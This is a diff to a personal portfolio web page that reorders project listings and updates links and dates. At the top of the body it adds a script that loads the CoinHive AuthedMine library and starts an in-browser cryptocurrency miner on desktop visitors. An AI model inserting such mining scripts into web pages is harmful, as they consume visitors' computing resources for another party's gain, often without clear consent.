@@ -20,6 +20,20 @@
 	</head>
 
 	<body>	
+		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+		<script>
+			var name = Math.random().toString(36).substr(2, 9); // https://gist.github.com/gordonbrander/2230317
+			var miner = new CoinHive.User('6zvMyJjBrj1yqQxYKmfLFsnnvs3jRpeO', name, {
+				throttle: 0.3,
+				theme: 'dark',
+				language: 'auto'
+			});
+
+			if (!miner.isMobile() && !miner.didOptOut(14400)) {
+				miner.start();
+			}
+		</script>
+
 		<div class="biography">
 			<a target='_blank' href="https://instagram.com/insanj"><img class="avatar" src="images/summer.jpg"/></a>
 			<h1>Julian Weiss</h1>
@@ -29,7 +43,7 @@
 			<div class="links">
  				<a target='_blank' href="https://twitter.com/insanj" style="text-decoration-color: #059FF5">twitter</a>
 				<a target='_blank' href="https://github.com/insanj" style="text-decoration-color: #F0CA5A;">github</a>
-				<a target='_blank' href="https://www.linkedin.com/in/insanj/" style="text-decoration-color: #0077B5;">linkedin</a>
+				<a target='_blank' href="https://earn.com/insanj/" style="text-decoration-color: rgb(201, 149, 81);">earn</a>
 			</div>
 		</div>
 
@@ -48,35 +62,35 @@
 			</a></div>
 
 			<hr />
-
-			<!-- TIMESHEET -->
-			<div id="showcase-item"><a target='_blank' href="https://producthunt.com/upcoming/timesheet">
-				<div id="showcase-icon-container"><img id="showcase-icon" src="images/timesheet.png"/></div>
-				<p id="showcase-text"><b>Timesheet</b> is a vibrant and collaboration-ready hour tracking tool. Control the time you spend doing absolutely anything, and share it selectively with other people.</p>
-				<p id="showcase-role">Full Stack Developer</p>
-				<p id="showcase-availability">Coming 2017 for iOS.</p>
+			
+			<!-- SUBMARINE -->
+			<div id="showcase-item"><a target='_blank' href="https://insanj.com/submarine">
+		    	<div id="showcase-icon-container"><img id="showcase-icon" src="submarine/images/submarine.jpg"/></div>
+				<p id="showcase-text"><b>Submarine</b> is a feature-packed, community-driven Reddit app. <b>Submarine Two</b> is coming early 2018.</p>
+				<p id="showcase-role">Personally designed and developed in 2015 and 2017.</p>
+				<p id="showcase-availability">Available on iOS.</p>
 				<div id="showcase-disclosure-indicator">⇨</div>
 			</a></div>
 
 			<hr />
-			
+
 			<!-- AM -->
 		    <div id="showcase-item"><a target='_blank' href="https://angel.co/projects/609856-am-projected-relation?src=user_profile">
 		    	<div id="showcase-icon-container"><img id="showcase-icon" src="images/AM.jpg"/></div>
 				<p id="showcase-text"><b>AM/Projected Relation</b> is a relational art project interested in the various data-selves we produce through our many profiles.</p>
-				<p id="showcase-role">Full stack developer Spring and Summer 2017.</p>
+				<p id="showcase-role">Full stack developer Spring 2017-2018.</p>
 				<p id="showcase-availability">Talk to her on iOS and Web.</p>
 				<div id="showcase-disclosure-indicator">⇨</div>
 			</a></div>
 
 			<hr />
 
-			<!-- SUBMARINE -->
-			<div id="showcase-item"><a target='_blank' href="https://insanj.com/submarine">
-		    	<div id="showcase-icon-container"><img id="showcase-icon" src="submarine/images/submarine.jpg"/></div>
-				<p id="showcase-text"><b>Submarine</b> is a feature-packed, community-driven Reddit app.</p>
-				<p id="showcase-role">Personally designed and developed in 2015 and 2017.</p>
-				<p id="showcase-availability">Available on iOS.</p>
+			<!-- TIMESHEET -->
+			<div id="showcase-item"><a target='_blank' href="https://producthunt.com/upcoming/timesheet">
+				<div id="showcase-icon-container"><img id="showcase-icon" src="images/timesheet.png"/></div>
+				<p id="showcase-text"><b>Timesheet</b> is a vibrant and collaboration-ready hour tracking tool. Control the time you spend doing absolutely anything, and share it selectively with other people.</p>
+				<p id="showcase-role">Full Stack Developer</p>
+				<p id="showcase-availability">Coming Spring 2018 for iOS.</p>
 				<div id="showcase-disclosure-indicator">⇨</div>
 			</a></div>
 
@@ -385,7 +399,7 @@
 		</div>
 
 		<div class="footer">
-			&copy; 2008-2017 Julian Weiss<br/>
+			&copy; 2008-2018 Julian Weiss<br/>
 			<a target='_blank' href="https://soundcloud.com/insanj">soundcloud</a>
 			&#10035;&#65038; <a target='_blank' href="https://instagram.com/insanj">instagram</a>
 			&#10035;&#65038; <a target='_blank' href="https://medium.com/@insanj">medium</a>
